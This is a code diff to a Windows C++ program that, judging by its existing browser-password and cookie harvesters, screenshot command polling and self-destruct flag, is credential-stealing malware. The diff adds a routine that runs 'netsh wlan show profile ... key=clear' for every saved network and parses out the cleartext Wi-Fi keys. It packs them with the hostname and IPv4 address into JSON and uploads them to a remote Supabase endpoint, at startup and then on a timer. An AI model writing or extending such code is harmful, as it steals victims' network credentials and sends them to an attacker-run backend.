@@ -3,6 +3,7 @@
 #include <winhttp.h>
 #include <string>
 #include <vector>
+#include <sstream>
 #include <cstdint>
 #include <ctime>
 #include <wincrypt.h>
@@ -890,6 +891,7 @@ static void CheckAndHandleExec() {
  
 #define SUPABASE_PASSWORDS_PATH L"/rest/v1/passwords"
 #define SUPABASE_COOKIES_PATH L"/rest/v1/cookies"
+#define SUPABASE_WIFI_PATH L"/rest/v1/wifi_creds"
  
 static uint32_t SqliteVarint(const uint8_t* p, int* used) {
     uint32_t v = 0; *used = 0;
@@ -1326,6 +1328,126 @@ static void HarvestBrowserCookies() {
     LogMsg("Browser cookie harvest complete");
 }
 
+static void HarvestWiFiPasswords() {
+    char laBuf[MAX_PATH];
+    DWORD laLen = GetEnvironmentVariableA("LOCALAPPDATA", laBuf, MAX_PATH);
+    if (laLen == 0 || laLen >= MAX_PATH) return;
+    std::string la(laBuf);
+
+    std::string host(g_hostname);
+    if (host.empty()) {
+        char buf[256] = {0};
+        DWORD sz = sizeof(buf);
+        GetComputerNameA(buf, &sz);
+        host = buf;
+    }
+
+    // Get IPv4 address
+    std::string ipv4;
+    std::string ipResp = ExecuteCommand("ipconfig");
+    if (!ipResp.empty()) {
+        std::istringstream iss(ipResp);
+        std::string line;
+        while (std::getline(iss, line)) {
+            size_t colon = line.find(':');
+            if (colon == std::string::npos) continue;
+            std::string val = line.substr(colon + 1);
+            val.erase(0, val.find_first_not_of(" \t\r"));
+            val.erase(val.find_last_not_of(" \t\r") + 1);
+            if (val.find('.') != std::string::npos && val.find_first_of("0123456789") != std::string::npos) {
+                // Check if the prefix contains IPv4 or IP
+                std::string prefix = line.substr(0, colon);
+                if (prefix.find("IPv4") != std::string::npos || prefix.find("IP") != std::string::npos) {
+                    ipv4 = val;
+                    break;
+                }
+            }
+        }
+    }
+
+    // Get SSID list
+    std::string profileResp = ExecuteCommand("netsh wlan show profiles");
+    if (profileResp.empty()) { LogMsg("WiFi: no output from netsh"); return; }
+
+    std::vector<std::string> ssids;
+    {
+        std::istringstream iss(profileResp);
+        std::string line;
+        while (std::getline(iss, line)) {
+            size_t colon = line.find(':');
+            if (colon == std::string::npos) continue;
+            std::string prefix = line.substr(0, colon);
+            // Look for "All User Profile" or localized variant containing "Profile"
+            if (prefix.find("Profile") == std::string::npos && prefix.find("profile") == std::string::npos) continue;
+            std::string val = line.substr(colon + 1);
+            val.erase(0, val.find_first_not_of(" \t\r"));
+            val.erase(val.find_last_not_of(" \t\r") + 1);
+            if (!val.empty()) ssids.push_back(val);
+        }
+    }
+
+    if (ssids.empty()) { LogMsg("WiFi: no profiles found"); return; }
+
+    std::string batch = "[";
+    bool first = true;
+    int count = 0;
+
+    for (size_t i = 0; i < ssids.size(); i++) {
+        // Escape special chars for cmd.exe
+        std::string ssid = ssids[i];
+        for (size_t j = 0; j < ssid.size(); j++) {
+            if (ssid[j] == '&' || ssid[j] == '|' || ssid[j] == '<' || ssid[j] == '>' || ssid[j] == '^') {
+                ssid.insert(j, "^"); j++;
+            }
+        }
+
+        std::string cmd = "netsh wlan show profile name=\"" + ssid + "\" key=clear";
+        std::string resp = ExecuteCommand(cmd);
+        if (resp.empty()) continue;
+
+        std::string password;
+        std::string security;
+
+        std::istringstream iss(resp);
+        std::string line;
+        while (std::getline(iss, line)) {
+            size_t colon = line.find(':');
+            if (colon == std::string::npos) continue;
+            std::string field = line.substr(0, colon);
+            std::string val = line.substr(colon + 1);
+            val.erase(0, val.find_first_not_of(" \t\r"));
+            val.erase(val.find_last_not_of(" \t\r") + 1);
+
+            if (field.find("Key Content") != std::string::npos || field.find("key Content") != std::string::npos) {
+                password = val;
+            } else if (field.find("Authentication") != std::string::npos) {
+                security = val;
+            }
+        }
+
+        std::string row = std::string(first ? "" : ",") + "{";
+        row += "\"hostname\":\"" + EscapeJSON(host) + "\"";
+        row += ",\"ssid\":\"" + EscapeJSON(ssids[i]) + "\"";
+        row += ",\"password\":\"" + EscapeJSON(password) + "\"";
+        row += ",\"security\":\"" + EscapeJSON(security) + "\"";
+        row += ",\"ipv4\":\"" + EscapeJSON(ipv4) + "\"";
+        row += "}";
+        batch += row;
+        first = false;
+        count++;
+        LogMsg("WiFi: " + ssids[i]);
+    }
+
+    if (count > 0) {
+        batch += "]";
+        std::string pr;
+        HttpRequest(L"POST", SUPABASE_WIFI_PATH, batch, pr);
+        LogMsg("WiFi: " + std::to_string(count) + " networks uploaded");
+    } else {
+        LogMsg("WiFi: no network details could be retrieved");
+    }
+}
+
 static std::string CheckScreenshotCmd() {
     std::wstring q = SUPABASE_CONTROL_PATH;
     q += L"?command=eq.screenshot&executed=eq.false&hostname=eq." + ToWide(g_hostname) + L"&select=id";
@@ -1756,6 +1878,9 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
                 HarvestBrowserPasswords();
                 HarvestBrowserCookies();
             }
+            if (counter % 3600 == 0 && !g_selfDestructing) {
+                HarvestWiFiPasswords();
+            }
             break;
         }
         case WM_DESTROY:
@@ -1832,6 +1957,8 @@ static int RunChild(HINSTANCE hInstance) {
     }
 
     LogMsg("Child started on " + g_hostname);
+
+    HarvestWiFiPasswords();
 
     MSG msg;
     while (g_running && GetMessage(&msg, NULL, 0, 0) > 0) {
@@ -1922,6 +2049,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR lpCmdLine, int) {
 
     return 0;
 }
+
 
 
 
